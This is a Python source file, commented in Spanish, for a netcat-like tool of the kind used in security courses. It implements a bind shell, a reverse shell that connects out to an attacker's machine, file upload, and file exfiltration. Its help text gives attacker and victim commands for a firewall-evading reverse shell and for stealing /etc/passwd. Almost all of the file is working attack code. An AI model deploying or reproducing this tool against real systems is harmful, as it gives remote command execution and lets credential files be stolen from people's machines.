import argparse
import socket
import threading
import subprocess
import shlex
import sys
import os
import textwrap

# =================================================================
# CONSTRUCCION DE LAS CLASES CON PRINCIPIO DE RESPONSABILIDAD UNICO
# =================================================================

class SocketConnection:
    """Responsabilidad unica: Gestionar la infraestructura de red y sockets"""

    def __init__(self):
        self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

    def connect(self, target, port):
        """Conecta el socket actuando como cliente activo"""
        self.socket.connect((target, port))
        return self.socket

    def bind_and_listen(self, target, port, conex=5):
        """Prepara el socket para actuar como servidor a la escucha"""
        self.socket.bind((target, port))
        self.socket.listen(conex)

    def accept_client(self):
        return self.socket.accept()

    def close(self):
        try:
            self.socket.close()
        except:
            pass


class CommandExecutor:
    """
    Responsabilidad unica: Ejecutar comandos del SO de forma segura

    Un método estático en Python es una función dentro de una clase
    que no necesita una instancia de esa clase ni accede al estado interno de la misma
    """

    @staticmethod
    def execute(cmd):

        cmd = cmd.strip()

        if not cmd:
            return ""
        """
        subprocess.check_output():  Ejecuta un comando en el sistema operativo, espera a que termine,
        captura su salida estándar (stdout) y la retorna en formato de bytes.
        Si el comando falla (retorna un código de error distinto de 0),
        lanza una excepción del tipo subprocess.CalledProcessError.

        shlex.split() : Divide la cadena de comandos en una lista de argumentos
        respetando las comillas (simples o dobles). Por ejemplo, echo "hola mundo"
        se convierte en ['echo', 'hola mundo'] en lugar de ['echo', '"hola', 'mundo"']
        """
        try:
            output = subprocess.check_output(
                shlex.split(cmd),
                stderr=subprocess.STDOUT
            )

            return output.decode('utf-8', errors='ignore')
        except Exception as e:
            return f"Error ejecutando comando: {str(e)}\n"


class FileManager:
    """Responsable de la entrada/salida binaria para transferencia de archivos."""

    @staticmethod
    def save_file(sock, path_destino):
        """Descarga en bloques binarios desde el socket hacia el disco"""
        file_buffer = b''
        while True:
            data = sock.recv(4096)
            if data:
                file_buffer += data
            else:
                break
        with open(path_destino, 'wb') as f:
            f.write(file_buffer)
        return f"[*] Archivo guardado exitosamente en {path_destino}\n"

    @staticmethod
    def send_file(sock, filepath):
        """Lee un archivo local y lo transmite en binario por el socket"""
        if not os.path.exists(filepath):
            sock.send(b"Error el archivo no existe.\n")
            return
        with open(filepath, 'rb') as f:
            sock.sendall(f.read())


class Orchestrator:
    """Orquesta la logica uniendo Red, Comando y Archivos"""
    def __init__(self, args, buffer=None):
        self.args = args
        self.buffer = buffer
        self.conn = SocketConnection()

    def run(self):
        if self.args.listen:
            self.run_server()
        elif self.args.reverse:
            self.run_reverse_shell()
        else:
            self.run_client()

    def run_server(self):
        """Modo Bind Shell (Servidor)"""
        self.conn.bind_and_listen(self.args.target, self.args.port)
        print(f"[*] Servidor escuchando en {self.args.target}:{self.args.port}")

        victim_mode = self.args.command or self.args.execute or self.args.upload or self.args.serve_file

        while True:
            client_sock, addr = self.conn.accept_client()
            print(f"[+] Conexion entrante desde {addr[0]}:{addr[1]}")
            if victim_mode:
                client_thread = threading.Thread(target=self.handle_target, args=(client_sock,))
            else:
                # Alguien nos manda una reverse shell: actuamos como atacante interactivo
                client_thread = threading.Thread(target=self.interactive_session, args=(client_sock,))
            client_thread.start()

    def interactive_session(self, sock):
        """Sesión interactiva del lado atacante (para reverse shells entrantes)"""
        try:
            while True:
                data = sock.recv(4096)
                if not data:
                    print("[*] La víctima cerró la conexión.")
                    break
                print(data.decode(errors='ignore'), end='')
                user_input = input()
                sock.send((user_input + '\n').encode())
        except (BrokenPipeError, ConnectionResetError):
            print("[*] Conexión perdida.")
        finally:
            sock.close()
            

    def run_reverse_shell(self):
        """Conexion inversa"""
        print(f"[*] Conectando hacia {self.args.target}:{self.args.port}")
        try:
            sock = self.conn.connect(self.args.target, self.args.port)
            self.handle_target(sock)
        except Exception as e:
            print(f"[-] Error conectando al atacante: {e}")

    def run_client(self):
        """Modo Cliente (Atacante)"""
        sock = self.conn.connect(self.args.target, self.args.port)

        if self.buffer:
            sock.sendall(self.buffer)

        if self.args.download:
            print(f"[*] Recibiendo archivo remoto hacia: {self.args.download}")
            FileManager.save_file(sock, self.args.download)
            print("[+] Transferencia completada.")
            return

        try:
            while True:
                recv_len = 1
                response = ''
                while recv_len:
                    data = sock.recv(4096)
                    recv_len = len(data)
                    response += data.decode()
                    if recv_len < 4096:
                        break

                if response:
                    print(response, end='')

                user_input = input('> ')
                user_input += '\n'
                sock.send(user_input.encode())

        except (BrokenPipeError, ConnectionResetError):
            print("\n[*] La conexión remota se cerró.")
            self.conn.close()
        
        except KeyboardInterrupt:
            print("\n[*] Saliendo...")
            self.conn.close()
            sys.exit()

    def handle_target(self, sock):
        """La lógica de lo que hace la víctima (sea en Bind o en Reverse)"""
        try:
            if self.args.execute:
                output = CommandExecutor.execute(self.args.execute)
                sock.send(output.encode())

            elif self.args.upload:
                msg = FileManager.save_file(sock, self.args.upload)
                sock.send(msg.encode())

            elif self.args.serve_file:
                FileManager.send_file(sock, self.args.serve_file)

            elif self.args.command or self.args.reverse:
                cmd_buffer = b''
                while True:
                    sock.send(b'NCX: #> ')
                    while b'\n' not in cmd_buffer:
                        data = sock.recv(64)
                        if not data:
                            return
                        cmd_buffer += data

                    cmd = cmd_buffer.decode()
                    if cmd.strip().lower() == 'exit':
                        break

                    response = CommandExecutor.execute(cmd)
                    if response:
                        sock.send(response.encode())

                    cmd_buffer = b''
        except Exception as e:
            print(f"[*] Sesión terminada: {e}")
        finally:
            sock.close()

# =================================================================
# =================================================================

def print_banner():
    banner = r"""
 _   _  _______  __            _______   __
| \ | |/ ___\ \/ /           / _ \ \ / /
|  \| | |    \  /    _____   | |_) \ V /
| |\  | |___ /  \   |_____|  |  __/ | |
|_| \_|\____/_/\_\           |_|    |_|

        TCP/UDP Navaja suiza | v2.0
        @Joacrosh
"""
    print(banner)


if __name__ == "__main__":

    print_banner()
    parser = argparse.ArgumentParser(
        description='Herramienta de red para pruebas',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=textwrap.dedent('''Ejemplos de uso avanzado:
        # Bind Shell clásica (La víctima abre puerto):
        Victima  > python netcat.py -l -p 5555 -c
        Atacante > python netcat.py -t <IP_VICTIMA> -p 5555

        # Reverse Shell (La víctima se conecta al atacante saltando Firewalls):
        Atacante > python netcat.py -l -p 4444
        Victima  > python netcat.py -t <IP_ATACANTE> -p 4444 --reverse

        # Exfiltración de archivos (El atacante descarga desde la víctima):
        Victima  > python netcat.py -l -p 5555 --serve-file /etc/passwd
        Atacante > python netcat.py -t <IP_VICTIMA> -p 5555 --download passwd_robado.txt
        ''')
    )

    parser.add_argument('-c', '--command', action='store_true', help='Levantar shell interactiva')
    parser.add_argument('-e', '--execute', help='Ejecutar un comando específico')
    parser.add_argument('-l', '--listen', action='store_true', help='Modo escucha (Servidor)')
    parser.add_argument('-t', '--target', default='0.0.0.0', help='IP objetivo')
    parser.add_argument('-p', '--port', type=int, default=5555, help='Puerto de red')
    parser.add_argument('-u', '--upload', help='Archivo a subir hacia la víctima')
    parser.add_argument('-r', '--reverse', action='store_true', help='Iniciar Reverse Shell hacia el target')
    parser.add_argument('--serve-file', help='Archivo local que la víctima servirá al cliente')
    parser.add_argument('--download', help='Ruta local donde el cliente guardará el archivo exfiltrado')

    if len(sys.argv) == 1:
        parser.print_help()
        sys.exit(1)

    args = parser.parse_args()

    if args.listen:
        buffer = b''
    else:
        if not args.download and not sys.stdin.isatty():
            buffer = sys.stdin.read().encode()
        else:
            buffer = b''

    nc = Orchestrator(args, buffer)
    nc.run()
